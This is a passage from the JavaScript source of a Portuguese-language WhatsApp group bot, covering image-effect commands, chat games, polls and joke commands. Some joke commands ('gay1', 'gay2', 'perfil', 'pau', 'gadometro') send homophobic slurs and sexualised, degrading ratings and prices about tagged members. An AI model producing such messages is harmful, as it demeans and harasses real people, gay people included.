txt2 = textin.split("/")[1];
txt3 = textin.split("/")[2];
if(!textin) return reply("Cade o texto?")
if(!textin.includes("/")) return reply(`Cade a / precisa dela para a separação..\nExemplo: ${prefix + command} Game/Play/Sad`)
reply(enviar.espere)
bla = await fetchJson(`https://manuella-api-pl.herokuapp.com/api/${command}?texto=${txt1}&texto2=${txt2}&texto3=${txt3}&apikey=${keyapi}`)
blabla = await getBuffer(bla.resultado.imageUrl)
aqua.sendMessage(from, {image: blabla}, {quoted: selo}).catch(rs =>{
reply("ERROR!!")  
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break  

case 'marvel': 
case 'glitch':   
case 'stone':   
case 'space':
case 'pornhub':
case 'america':   
case 'steel':  
case 'grafity':  
case 'glitch3':  
try {
texto = args.join(' ')
texto1 = texto.split('/')[0] || 'Indefinido'
texto2 = texto.split('/')[1] || 'Indefinido'
if(!texto.includes("/")) return reply(`Cade a /\nExemplo: ${prefix + command} sad/sad`)
reply(enviar.espere)
bla = await fetchJson(`https://manuella-api-pl.herokuapp.com/api/${command}?texto=${texto1}&texto2=${texto2}&apikey=${keyapi}`)
blabla = await getBuffer(bla.resultado)
aqua.sendMessage(from, {image: blabla}, {quoted: selo})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'lava':
case 'toxic':  
case 'thunder': 
case 'thunderv2':  
case 'neongreen':	
case 'neon':  
case 'neon1':  
case 'neon3d':  
case 'demongreen':   
case 'metalfire':  
case 'rainbow':	  
case 'gelo':
case 'halloween':  
case 'lapis':  
case 'glitch':  
case 'glitch2':   
case '3dgold': 
case 'neon3d':   
case 'transformer':  
case '3dstone':
case 'fiction':
case 'cattxt':
case 'neondevil':
case 'demonfire':
case 'colaq':
case 'luxury':
case 'berry':
case 'matrix':
case 'horror':
case 'nuvem':
case 'neon3':
case 'neve':
case 'areia':
case 'vidro':
case 'style':
case 'blood':
case 'pink':
case 'carbon':
case 'metalblue': 
case 'jeans':  
case 'jokerlogo':   
case 'natal': 
case 'ossos':  
case 'asfalto':	
case 'break':  
try {
reply(enviar.espere)
texto = args.join(" ") || 'Indefinido'
if(!texto) return reply('Cade o texto?')
bla = await fetchJson(`https://manuella-api-pl.herokuapp.com/api/${command}?texto=${texto}&apikey=${keyapi}`)
blabla = await getBuffer(bla.resultado)
aqua.sendMessage(from, {image: blabla}, {quoted: selo})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break



case 'arma':
case 'figuarma':
if ((isMedia && !m.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(m).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : m
reply(enviar.espere)
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
link = await upload(base64)
postt = await getBuffer(`https://api-exteam.herokuapp.com/api/gun?img=${link}`)
aqua.sendMessage(from, {image: postt}, {quoted: selo})
} else {
reply('Selecione uma imagem...!')
}
break

case 'lgbt':  
try {
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
reply(enviar.espere)
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
link = await upload(base64)
postt = await getBuffer(`https://manuella-api-pl.herokuapp.com/canvas/lgbt?url=${link}&apikey=${keyapi}`)
aqua.sendMessage(from, {image: postt}, {quoted: selo})
} else {
reply('Selecione uma imagem...!')
}
} catch {
reply('ERROR')
}
break

case 'rip':  
case 'morto':  
try {
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info
reply(enviar.espere)
imagem = await downloadContentFromMessage(post, 'image')
base64 = Buffer.from([])
for await(const send of imagem) { base64 = Buffer.concat( [ base64, send ] ) }
link = await upload(base64)
postt = await getBuffer(`http://manuella-api-pl.herokuapp.com/canvas/rip?url=${link}&apikey=${PLkey}`)
aqua.sendMessage(from, {image: postt}, {quoted: selo})
} else {
reply('Selecione uma imagem...!')
}
} catch {
reply('ERROR')
}
break

case 'triggered':
try {
if(!isQuotedImage) return reply("Marque uma imagem")
if ((isMedia && !info.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo : info
imagem = await downloadContentFromMessage(boij, 'image')
owgi = Buffer.from([])
for await(const send of imagem) { owgi = Buffer.concat( [ owgi, send ] ) }
res = await upload(owgi)
post = await fetchJson(`https://manuella-api-pl.herokuapp.com/canvas/trigger?url=${res}&apikey=${PLkey}`)
sendStickerFromUrl(from, {sticker: post}, {quoted:info})
} else {
reply('error')
}
} catch {
reply('ERROR')
}
break
//========INÍCIO DOS JOGOS=============


case 'resetaki':
try {
if (!isGroup) return reply(`Só em grupo`)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
akinator[0][from] = undefined
fs.writeFileSync('./funções de cmd/funções/akinator.json', JSON.stringify(akinator, null, 2))
buttons_opts = [
{buttonId: 'akinator sim', buttonText: {displayText: 'Sim'}, type: 1},
{buttonId: 'akinator nao', buttonText: {displayText: 'Não'}, type: 1},
]
sendbuttonsMessage = {
text: `*Jogo reiniciado com sucesso! Deseja jogar outra partida?*`,
footer: 'Sim ou não?',
buttons: buttons_opts,
headerType: 1
}
aqua.sendMessage(from, sendbuttonsMessage)
} catch {
reply("Nenhuma sessão em andamento...")
}
break
case 'respaki':
if(!info.message.listResponseMessage) return
if(akinator[0][from] && akinator[0][from].player != sender) return reply('*Não é você que está jogando*')
if(args.length < 1) return 
await akinator[0][from].game.step(args[0])
if(akinator[0][from].game.progress > 85) {
    await akinator[0][from].game.win()
    teks = `Por acaso seu personagem é ${akinator[0][from].game.answers[0].name}?`
    buttons_opts = [
{buttonId: 'finaki sim', buttonText: {displayText: 'Sim'}, type: 1},
{buttonId: 'finaki nao', buttonText: {displayText: 'Não'}, type: 1},
    ]
    sendbuttonsMessage = {
image: {url: akinator[0][from].game.answers[0].absolute_picture_path},
caption: `Já sei!\n\n${teks}`,
footer: 'Sim ou não?',
buttons: buttons_opts,
headerType: 1
    }
    aqua.sendMessage(from, sendbuttonsMessage)
} else {
    listMessage = {
text: akinator[0][from].game.question,
footer: 'Mostrar opções',
buttonText: 'Opções',
title: "Pergunta",
sections: [{
title: 'Opções',
rows: [{
rowId: `${prefix}respaki 0`,
title: 'Sim',
description: ''
},
{
rowId: `${prefix}respaki 1`,
title: 'Não',
description: ''
},{
rowId: `${prefix}respaki 2`,
title: 'Não sei',
description: ''
},{
rowId: `${prefix}respaki 3`,
title: 'Provavelmente sim',
description: ''
},
{
rowId: `${prefix}respaki 4`,
title: 'Provavelmente não',
description: ''
}]
}]
    }
    aqua.sendMessage(from, listMessage)
}
break

case 'akinator':
buttons_opts = [
    {buttonId: 'akinator sim', buttonText: {displayText: 'Sim'}, type: 1},
    {buttonId: 'akinator nao', buttonText: {displayText: 'Não'}, type: 1},
]
sendbuttonsMessage = {
    image: fs.readFileSync('./mídia-ft-vd/fotos/deusa.jpg'),
    caption: "Olá, sou o akinator",
    footer: 'Vamos jogar um jogo?',
    buttons: buttons_opts,
    headerType: 1
}
aqua.sendMessage(from, sendbuttonsMessage)
break

case 'resetforca':
if(!isPlayForca) return reply(`*Você não iniciou uma partida, para iniciar dê o comando ${prefix}jogodaforca*`)
pla_pos = allForcaId.indexOf(sender)
forca.splice(pla_pos, 1)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
reply(`*Jogo da forca reiniciado com sucesso. Para iniciar outra partida dê o comando ${prefix}jogodaforca*`)
break
case 'forca':
if(!isPlayForca) return reply(`*Você não iniciou uma partida, para iniciar dê o comando ${prefix}jogodaforca*`)
if(args.length < 1) return reply(`*Dê o comando mais a letra para advinhar*`)
if(args[0].trim().length < 2) {
    p_pos = allForcaId.indexOf(sender)
    find = forca[p_pos].word.match(args[0].toLowerCase())
    is_correct = false 
    while(find != null) {
res_tmp = forca[p_pos].word.indexOf(args[0].toLowerCase())
forca[p_pos].array_under_word[res_tmp] = args[0].toLowerCase()
forca[p_pos].array_word[res_tmp] = 0
forca[p_pos].word = forca[p_pos].word.replace(args[0].toLowerCase(), 0)
find = forca[p_pos].word.match(args[0].toLowerCase())
is_correct = true
    }
    if(is_correct) {
str_under = ''
for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
attempts = forca[p_pos].attempts
if(str_under == forca[p_pos].word_original) {
reply(`*Parabéns, Você venceu o jogo!✅🥳*\n\n${puppet[attempts]}\n\n_*Palavra: ${str_under.split('').join(' ')}*_`)
forca.splice(p_pos, 1)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
} else {
reply(`*Você acertou!✅*\n\n${puppet[attempts]}\n\n_*Palavra: ${str_under.split('').join(' ')}*_\n*Você tem ${attempts} chances*`)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
}
    } else  {
str_under = ''
for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
forca[p_pos].attempts -= 1
attempts = forca[p_pos].attempts
if(forca[p_pos].attempts <= 0) {
forca.splice(p_pos, 1)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
reply(`*Você perdeu o jogo!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Suas chances se esgotaram*`)
} else {
reply(`*Você errou!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Você tem ${attempts} chances*`)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
}
    }
} else {
    p_pos = allForcaId.indexOf(sender)
    if(forca[p_pos].word_original == args[0].toLowerCase()) {
attempts = forca[p_pos].attempts
reply(`*Parabéns, Você venceu o jogo!✅🥳*\n\n${puppet[attempts]}\n\n_*Palavra: ${forca[p_pos].word_original.split('').join(' ')}*_`)
forca.splice(p_pos, 1)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
    } else {
str_under = ''
for(i=0;i<forca[p_pos].array_under_word.length;++i) str_under += forca[p_pos].array_under_word[i]
forca[p_pos].attempts -= 1
attempts = forca[p_pos].attempts
if(forca[p_pos].attempts <= 0) {
forca.splice(p_pos, 1)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
reply(`*Você perdeu o jogo!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Suas chances se esgotaram*`)
} else {
reply(`*Você errou!❌*\n\n${puppet[attempts]}\n\n*Palavra: ${str_under.split('').join(' ')}*\n*Você tem ${attempts} chances*`)
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
}
    }
}
break
case 'jogodaforca':
if(isPlayForca) return reply(`*Termine a partida iniciada para jogar uma nova, ou dê o comando ${prefix}resetforca*`)
word_correct = (await randompalavra()).slice(1).normalize('NFD').replace(/[\u0300-\u036f]/g, "").toLowerCase()
under_word = '-'.repeat(word_correct.length)
forca.push({
    id: sender,
    word_original: word_correct,
    word: word_correct,
    under_word: under_word,
    array_word: Array.from(word_correct),
    array_under_word: Array.from(under_word),
    tam: word_correct.length,
    attempts: 6
})
fs.writeFileSync('./funções/database/forca.json', JSON.stringify(forca, null, 2))
reply(`[👤] JOGO DA FORCA [👤]

┠➥ *[🗣️] PALAVRA:* ${under_word.split('').join(' ')}
┠➥ *[👥] CHANCES:* ${attempts}
┠➥ *[⚠️] USE:* ${prefix}forca
┠➥ E a Letra que vc Quer Tentar`)
break

case 'reagir': {
 reactionMessage = {
    react: {
text: args[0],
key: { remoteJid: from, fromMe: false, id: quoted.id }
    }
}
aqua.sendMessage(from, reactionMessage)
}
break       


case 'jogodavelha':
if(!isGroup) return reply('comando apenas para grupos')
joguinhodavelhajs.push(sender)
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.push(from)
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
if (fs.existsSync(`./funções de cmd/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
const matrix = boardnow._matrix;
const chatMove = `*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*
     
[❗] Alguém está jogando no momento...\n\n@${boardnow.X} VS @${boardnow.O}
     
❌ : @${boardnow.X}
⭕ : @${boardnow.O}
     
 Sua vez : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
     
${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
aqua.sendMessage(from, {text: chatMove}, {quoted: selo,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
],
},
});
return;
}
if (argss.length === 1)
return reply(`*⟅❗⟆ Jogue com Alguem!!!!*
*para inicar a partida : ${prefix + command} @membro do gp*`);
const boardnow = setGame(`${from}`);
console.log(`Start No jogodavelha ${boardnow.session}`);
boardnow.status = false;
boardnow.X = sender.replace("@s.whatsapp.net", "");
boardnow.O = argss[1].replace("@", "");
fs.writeFileSync(`./funções de cmd/tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const strChat = `*『📌ᎬՏᏢᎬᎡᎪΝᎠϴ ϴ ϴᏢϴΝᎬΝͲᎬ⚔️』*
     
@${sender.replace("@s.whatsapp.net",
"")} _está te desafiando para uma partida de jogo da velha..._
_[ ${argss[1]} ] Use *『S』* para aceitar ou *『N』* para não aceitar..._
     `;
aqua.sendMessage(from, {text: strChat}, {quoted: selo,
contextInfo: {
mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
},
});
break

case 'resetarvelha':
case 'resetavelha':  
case 'resetarv':
case 'resetav': 
case 'resetvelha':
case 'rv': 
if (!isJoguin && !isGroupAdmins) return reply(`Fale com quem iniciou o jogo, só ele pode resetar, ou então algum ADM`)
if (fs.existsSync("./funções de cmd/tictactoe/db/" + from + ".json")) {
fs.unlinkSync("./funções de cmd/tictactoe/db/" + from + ".json");
reply(`Jogo da velha resetado com sucesso nesse grupo!`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./funções de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
reply(`Não a nenhuma sessão em andamento...`);
}
break

case 'anagrama':
if(!isGroup) return reply('comando apenas para grupos')
const anaaleatorio = Math.floor(Math.random() * palavrasANA.length)
if(!isGroupAdmins) return reply('comando apenas para admins')
if(args.length == 0) return reply('use 1 para ativar o jogo do anagrama\npara desativar use anagrama 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./funções de cmd/anagrama-${from}.json`)) {
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./funções de cmd/anagrama-${from}.json`))
reply(`o jogo já foi iniciado neste grupo:
palavra: ${dataAnagrama2.embaralhada}
dica: ${dataAnagrama2.dica}
`)} else {
fs.writeFileSync(`./funções de cmd/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[anaaleatorio])}`)
aqua.sendMessage(from, {text: `
╭─────≽「 👾 ANAGRAMA 👾 」
│➽ DESCUBRA A PALAVRA
│➽ ANAGRAMA: ${palavrasANA[anaaleatorio].embaralhada}
│➽ DICA: ${palavrasANA[anaaleatorio].dica}
╰────────────────────────
`})
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./funções de cmd/anagrama-${from}.json`)) return reply('não tem como desativar o jogo do anagrama pôs ele não foi ativado')
fs.unlinkSync(`./funções de cmd/anagrama-${from}.json`)
reply("desativado com sucesso")
}
await limitAdd(sender)
break

case 'perfil':
try {
ppimg = await aqua.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}

var conselho = palavras[Math.floor(Math.random() * palavras.length)]
const nivelgado = ['1','2','3','4','5','6','7','8','9']
const nivelgado2 = ['1','2','3','4','5','6','7','8','9'] 
const nivelgador = nivelgado[Math.floor(Math.random() * (nivelgado.length))]
const nivelgado2r = nivelgado2[Math.floor(Math.random() * (nivelgado2.length))] 
const puta = ['1','2','3','4','5','6','7','8','9']
const puta2 = ['1','2','3','4','5','6','7','8','9'] 
const putar = puta[Math.floor(Math.random() * (puta.length))]
const putar2 = puta2[Math.floor(Math.random() * (puta2.length))] 
const gostosura = ['1','2','3','4','5','6','7','8','9']
const gostosura2 = ['1','2','3','4','5','6','7','8','9'] 
const gostosurar = gostosura[Math.floor(Math.random() * (gostosura.length))]
const gostosurar2 = gostosura2[Math.floor(Math.random() * (gostosura2.length))] 
var bio = await aqua.fetchStatus
var bioo = bio.status
gadop = `${Math.floor(Math.random() * 100)}`
const programa = Math.ceil(Math.random() * 10000)
const dptr = `
╭═━═━═━ • ❪ SEU PERFIL ❫ • ━═━═━
║╭═━═━═━═━═━═━═━═━═━═━═━
╿║•🗒 *Nome* : *${pushname}*
╿║
╿║•🥰 ${!isGroup ? `𝗨𝘀𝘂𝗮𝗿𝗶𝗼: ${pushname}` :  `𝗚𝗿𝘂𝗽𝗼: ${groupName}`}
╿║
╿║•🪀 *Número* : wa.me/${sender.split("@")[0]}
╿║
╿║•🗯 *SUA BIO* : ${bioo ? `${bioo}` :  `deve ser privado`}
╿║
╿║•🐂 *Nível gado* : *${nivelgador}${nivelgado2r}%*
╿║
╿║•📱 *Seu Célular* : ${m.key.id.length > 21 ? 'Android 🤣' : m.key.id.substring(0, 2) == '3A' ? 'IOS😂😂😅' : 'Zap zap web 😂😂☝🏼😅'}
╿║
╿║•😈 *Nível puta* : *${putar}${putar2}%*
╿║
╿║•😋 *Nível de gostosura* : *${gostosurar}${gostosurar2}%*
╿║
╿║•🍼 *Valor do programa* : *R$${programa}*
║╰═─═─═─═─ • ◆ • ─═─═─═─═─═
╰═━═━═━═━═━═━═━═━═━═━═━

➻ *~_CONSELHO_~* :
${conselho}`
daftarimg = await getBuffer(ppimg)
aqua.sendMessage(from, {image: daftarimg, caption: dptr}, {quoted: selo})
break

case 'conselhobiblico':
case 'conselhosbiblico':  
case 'conselhosb':   
case 'conselhob':  
var conselhosb = conselhob[Math.floor(Math.random() * conselhob.length)]   
jr = `
╭━─━───༺[🗯]༻────━─━╮
╿║• ${tempo} ${pushname} 
╿║
╿║• Conselhos Bíblico para você: 
╿║
╿║• ${conselhosb} 
╿║
╿║• Bot: ${NomeDoBot}
╿║• ${!isGroup ? `𝗨𝘀𝘂𝗮??𝗶𝗼: ${pushname}` :  `𝗚𝗿𝘂𝗽𝗼: ${groupName}`}
╰━─━───༺[💫]༻────━─━╯`
await aqua.sendMessage(from, {text: jr}, {quoted: selo, contextInfo: {"mentionedJid": jr}})
break

case 'joga-pedra': case 'jogar': {
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) reply(`Complete seu terno anterior`)
if (m.mentionedJid[0] === sender) return reply(`Não brincar com eu  !`)
if (!m.mentionedJid[0]) return reply(`_Quem você quer desafiar?_\nTag a pessoa..\n\nExemplo : ${prefix}suit @553175416530`)
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return reply(`A pessoa que você desafiou está jogando um jogo com outra pessoa :(`)
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} Desafiador @${m.mentionedJid[0].split`@`[0]} para jogar o jogo

Por favor @${m.mentionedJid[0].split`@`[0]} para digitar aceitar/rejeitar`
this.suit[id] = {
chat: await aqua.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) aqua.sendText(from, `_O tempo do jogo acabou._`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break

case 'quando': //by: 
if (args.length < 1) return reply('Digite a pergunta')
randomm = meupirul[Math.floor(Math.random() * meupirul.length)]
random2 = `${Math.floor(Math.random() * 11) + 1}`
if (randomm == 'Hoje' || randomm == 'Amanhã' || randomm == 'Nunca') {
texto = `Pergunta: ${body.slice(1)}\n\nResposta: ${randomm}`
} else if (random2 == 1) {
texto = `Pergunta: ${body.slice(1)}\n\nResposta: 1 ${randomm}`
} else {
random3 = meupirul2[Math.floor(Math.random() * meupirul2.length)]
texto = `Pergunta: ${body.slice(1)}\n\nResposta: ${random2} ${random3}`
}
reply(texto)
break

case 'nick':
case 'gerarnick':
case 'fazernick':
try {
nick = args.join(' ')
if(!nick) return reply('Escreva o Nick ou nome que você quer personalizar.')
axios.get(`https://manuella-api-pl.herokuapp.com/api/fazernick?nome=${nick}&apikey=${keyapi}`)
.then(dados => {
var emoji = `🔹`
nicks = dados.data
txt = '[💠] NICKS GERADOS [💠]'
for (let i = 0; i < nicks.length; i++) {
txt += `${emoji} ${nicks[i]}\n`
}
txt += `\n\n
┠➥ @Licht.Offc
┠➥ @AquaBot.Wpp`
reply(`${txt.trim()}`)
}).catch(e => {
reply('Não pode incluir letras modificadas nem emojis, ou pode ser que a api caiu, mas volta logo logo...')  
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\

case 'duelo':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
if (!isGroup) return reply('O comando só pode ser usado em Grupos.')
if (args.length === 0) return reply(`Modo de usar...\n\n${prefix}duelo @tag / @tag2 / 1 (1 = 1 Minuto)`)
txt = args.join(' ')
nmr = txt.split('/')[0].replace('@' ,  '').replace(' ', '').replace(' ', '').replace(' ', '')
nmr2 = txt.split('/')[1].replace('@' ,  '').replace(' ', '').replace(' ', '').replace(' ', '')
pergunta = 'Qual dos dois duelou melhor ou deu as melhores respostas?'
tempo = txt.split('/')[2]
if(!Number(tempo)) return reply('Ops, insira os minutos\n\n1 = 1 Minuto')

try {
ppimg = await aqua.profilePictureUrl(`${nmr}@s.whatsapp.net`)
} catch(erro) {
ppimg = 'https://telegra.ph/file/2c11af926dc6af8d05a42.mp4'
}
try {
ppimg2 = await aqua.profilePictureUrl(`${nmr2}@s.whatsapp.net`)
} catch(erro) {
ppimg2 = 'https://telegra.ph/file/cb84706c237cfce03609b.mp4'
}

shortpc = await axios.get(`https://tinyurl.com/api-create.php?url=${ppimg}`)
shortpc2 = await axios.get(`https://tinyurl.com/api-create.php?url=${ppimg2}`)
blup = await getBuffer(`http://api-exteam.herokuapp.com/api/duelo?foto=${shortpc.data}&foto2=${shortpc2.data}`)

await mencionar(blup, `⚔️*Duelo de Stickers*⚔️\n\n@${nmr}  Vs  @${nmr2}\n\nPergunta:  ${pergunta}\n\nDigite:  um = Para votar em:  @${nmr}\nDigite:  dois = Para votar em:  @${nmr2}\n\n⚠️ *Atenção*: só é permitido votar 1 única vez, portanto preste atenção em quem vai votar, pois não é possível alterar o voto.\n\n❗ _Não vote por afinidade, vote pela qualidade das respostas, assim você ajuda a melhorar a qualidade dos duelos..._`, [nmr+'@s.whatsapp.net', nmr2+'@s.whatsapp.net'], true)
addVotoDuelo(from , pergunta , nmr , nmr2 , tempo , reply)
break

//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\   
 
case 'enquete':
enquete = generateWAMessageFromContent(from, proto.Message.fromObject({
pollCreationMessage: {
options: [
{ optionName: 'NÃO' },
{ optionName: 'TALVEZ SIM'},
{ optionName: 'SIM'}, 
{ optionName: 'TALVEZ NÃO'}
],
name: `${q}`,
selectableOptionsCount: 0
}
}), { userJid: from })
await aqua.relayMessage(from, enquete.message, { messageId: enquete.key.id})
break

case 'enquete-dia':
enquete = generateWAMessageFromContent(from, proto.Message.fromObject({
pollCreationMessage: {
options: [
{ optionName: 'SEGUNDA' },
{ optionName: 'TERÇA'},
{ optionName: 'QUARTA'}, 
{ optionName: 'QUINGA' },
{ optionName: 'SEXTA'},
{ optionName: 'SÁBADO'}, 
{ optionName: 'DOMINGO'}
],
name: `${q}`,
selectableOptionsCount: 0
}
}), { userJid: from })
await aqua.relayMessage(from, enquete.message, { messageId: enquete.key.id})
break

case 'enquete-sn':
enquete = generateWAMessageFromContent(from, proto.Message.fromObject({
pollCreationMessage: {
options: [
{ optionName: 'SIM' },
{ optionName: 'NÃO'}
],
name: `${q}`,
selectableOptionsCount: 0
}
}), { userJid: from })
await aqua.relayMessage(from, enquete.message, { messageId: enquete.key.id})
break

case 'teles':
case 'telesticker':
if(args.length < 1) return reply(`exemplo ${prefix}teles https://t.me/addstickers/peepo_pack`)
usur = args.join(" ")
res = await Telesticker(usur)
await reply(`enviando ${res.length} stickers...`)
for (let i = 0; i < res.length; i++) {
bala = await getBuffer(res[i].url)
fs.writeFileSync('./imagem.webp', bala)
site = fs.readFileSync('./imagem.webp')
bass64 = `data:image/jpeg;base64,${site.toString('base64')}`
mantap = await convertSticker(bass64, `meu dono é ${numerodonoa}`, `📍Criado por > ${NomeDoBot}`)
imageBuffer = new Buffer.from(mantap, 'base64');
aqua.sendMessage(from, {sticker: imageBuffer}, {quoted: selo})
}
break

case 'chance': //Jogos
var avb = body.slice(7)
if (args.length < 1) return reply(`Você precisa digitar da forma correta\nExemplo: /chance do ${pushname} ser um trouxa`)
randomm = `${Math.floor(Math.random() * 100)}`
hasil = `A CHANCE ${body.slice(7)}\n\E DE... ${randomm}%`
let buttons = [
{ buttonId: '❤️', buttonText: { displayText: '❤️' }, type: 1 }
    ]
await aqua.sendButtonText(from, buttons, hasil, aqua.user.name, m)
break

case 'gado1':
case 'gadometro':
var chifre = ["ultra extreme gado", "Gado-Master", "Gado-Rei", "Gado", "Escravo-ceta", "Escravo-ceta Maximo", "Gacorno?", "Jogador De Forno Livre<3", "Mestre Do Frifai<3<3", "Gado-Manso", "Gado-Conformado", "Gado-Incubado", "Gado Deus", "Mestre dos Gados", "Topa tudo por buceta", "Gado Comum", "Mini Gadinho", "Gado Iniciante", "Gado Basico", "Gado Intermediario", "Gado Avançado", "Gado Profisional", "Gado Mestre", "Gado Chifrudo", "Corno Conformado", "Corno HiperChifrudo", "Chifrudo Deus", "Mestre dos Chifrudos"]
var gado = chifre[Math.floor(Math.random() * chifre.length)]
gadop = `${Math.floor(Math.random() * 100)}`
hisil = `VOCÊ É:\n\n${gado}`
reply(hisil)
break

case 'gay1':
if (args.length < 1) return reply('marque o gay do gp!')
rate = body.slice(5)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
 reply('COMO VOCÊ É GAY: *'+rate+'*\n\nSUA PORCENTAGEM GAY : '+ kl+'%\n ESSE AÍ AMA DÁ O CU')
break

case 'gay2':
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
 reply(`COMO VOCÊ É GAY: *${pushname}*\n\nSUA PORCENTAGEM GAY : `+ kl+`%\n VOCÊ AMA DÁ O CU NÉ KKK`)
break

case 'pau'://Jogos
randommmm = `${Math.floor(Math.random() * 35)}`
const tamanho = randommmm
if (tamanho < 13 ) {pp = 'só a fimose'} else if (tamanho == 13 ) {pp = 'passou da média😳'} else if (tamanho == 14 ) {pp = 'passou da média😳'} else if (tamanho == 15 ) {pp = 'eita, vai pegar manga?'} else if (tamanho == 16 ) {pp = 'eita, vai pegar manga?'} else if (tamanho == 17 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanho == 18 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanho == 19 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanho == 20 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 21 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 22 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 23 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 24 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho > 25 ) {pp = 'vai procurar petróleo com isso?'
}
hasil = `SEU PAU TEM ${randommmm}CM\n\n${pp}`
reply(hasil)
break

case 'shipo':
teks = args.join(" ")
if(teks.length < 10) return reply('Marque uma pessoa do grupo para encontrar o par dela')
membrr = []
const suamae111 = groupMembers
